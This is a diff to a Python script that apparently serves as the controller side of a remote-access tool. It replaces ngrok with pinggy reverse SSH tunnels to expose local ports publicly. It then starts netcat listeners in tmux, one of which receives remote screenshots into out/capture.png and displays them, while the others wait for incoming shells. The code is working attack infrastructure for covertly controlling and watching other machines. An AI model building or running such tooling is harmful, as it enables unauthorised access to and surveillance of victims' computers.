@@ -3,7 +3,6 @@ import os
 from subprocess import DEVNULL, run, check_output
 import sys
 from time import sleep
-import json
 import tempfile
 
 # ——— Configuration and constants
@@ -60,38 +59,37 @@ def make_new_session():
 
     # ——— Start new sessions
     for port in LOCAL_PORTS:
-        run(["tmux", "new-session", "-d", "-s", f"ngrok-tcp-{port}"])
-        run(["tmux", "send-keys", "-t", f"ngrok-tcp-{port}", f"ngrok tcp {port}", "ENTER"])
-    print(f"{C_MARK} Started ngrok tunnels.")
+        run(["tmux", "new-session", "-d", "-s", f"pinggy-tcp-{port}"])
+        run(["tmux", "send-keys", "-t", f"pinggy-tcp-{port}", f"sshpass -p '' ssh -p 443 -R0:localhost:{port} qr+tcp@free.pinggy.io", "ENTER"])
+    print(f"{C_MARK} Started pinggy tunnels.")
 
-    # ——— Gather tunnel information
+    # ——— Gather and parse tunnel information
     tunnels_exist = False
-    tunnels = []
+    middlemen = {}
     while not tunnels_exist:
         try:
-            tunnels = []
-            for i in range(len(LOCAL_PORTS)): # Read tunnel information for each port
-                tunnels.append(check_output(f"curl http://127.0.0.1:{4040+i}/api/tunnels", shell=True, stderr=DEVNULL).decode("utf-8"))
-            tunnels_exist = True
+            middlemen = {}
+
+            for port in LOCAL_PORTS: # Read tunnel information corresponding to each local port
+                tunnel_info = check_output(["tmux", "capture-pane", "-pt", f"pinggy-tcp-{port}"], stderr=DEVNULL).decode("utf-8")
+                
+                if("tcp://" in tunnel_info):
+                    middlemen[str(port)] = tunnel_info.split("tcp://")[1].split("\n")[0] # Extract the public URL for the tunnel
+            
+            if len(middlemen) == len(LOCAL_PORTS):
+                tunnels_exist = True
         except:
-            sleep(1) # Wait for tunnels to be established and information to be available before proceeding
-    print(f"{C_MARK} Retrieved tunnel information.")
-
-    # ——— Parse tunnel information
-    tunnel_data = []
-    for tunnel in tunnels: # Parse tunnel information from JSON output
-        tunnel_data.append(json.loads(tunnel))
-
-    middlemen = {}
-    for tunnel in tunnel_data: # Extract middleman information for each tunnel
-        middlemen[tunnel["tunnels"][0]["config"]["addr"].split(":")[1]] = tunnel["tunnels"][0]["public_url"].split("://")[1]
-    print(f"{C_MARK} Parsed tunnel information.")
+            sleep(1)
+    print(f"{C_MARK} Retrieved and parsed tunnel information.")
+    print(middlemen)
 
     # ——— Begin listening on local ports
     for i,port in enumerate(LOCAL_PORTS):
         run(["tmux", "new-session", "-d", "-s", f"listener-{port}"])
+        
         if i == 1: # If the second port, set up listener to capture screenshot
             run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -q 0 -lvnp {port} > out/capture.png; feh -x out/capture.png --geometry 1200x800+10-10 -. -Z --image-bg black; sleep 1; done", "ENTER"])
+        
         else: # Otherwise, set up normal listener
             run(["tmux", "send-keys", "-t", f"listener-{port}", f"while true; do nc -lvnp {port}; sleep 1; done", "ENTER"])
     print(f"{C_MARK} Began listening on local ports.")
